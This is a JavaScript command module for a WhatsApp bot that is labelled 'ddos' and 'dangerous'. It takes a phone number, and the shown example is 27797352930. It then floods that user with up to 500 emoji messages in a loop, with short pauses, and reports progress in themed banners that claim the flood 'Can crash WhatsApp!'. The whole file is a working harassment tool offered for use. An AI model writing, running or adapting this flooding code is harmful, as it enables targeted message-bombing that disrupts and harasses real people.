export default {
  name: 'ddos',
  description: 'DDOS attack on a user',
  category: 'dangerous',
  aliases: ['flood', 'attack'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];
    const count = parseInt(args[1]) || 100;

    if (!target) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ DDOS ATTACK 〕━━━┈⊷
┃ Flood a user with messages.
┃ 
┃ Usage: ${prefix}ddos <number> <count>
┃ 
┃ Example: ${prefix}ddos 27797352930 200
┃ 
┃ ⚠️ Can crash WhatsApp!
┃ 🧛 "The darkness floods."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    if (count > 500) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ Max count is 500!
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ DDOS STARTED 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 📊 Count: ${count}
┃ 
┃ 🧛 "The darkness attacks..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const emojis = ['🩸', '🧛', '🌑', '💀', '🔥', '⚡', '🦇', '👻'];
      let sent = 0;

      for (let i = 0; i < count; i++) {
        try {
          const emoji = emojis[i % emojis.length];
          const msgText = `${emoji.repeat(10)} [${i + 1}/${count}]`;
          await sock.sendMessage(userJid, {
            text: msgText
          });
          sent++;
          
          if (i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 100));
          }
        } catch {}
      }

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ DDOS COMPLETE 〕━━━┈⊷
┃ 📤 ${sent} messages sent to ${target}
┃ 
┃ 🧛 "The darkness floods."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
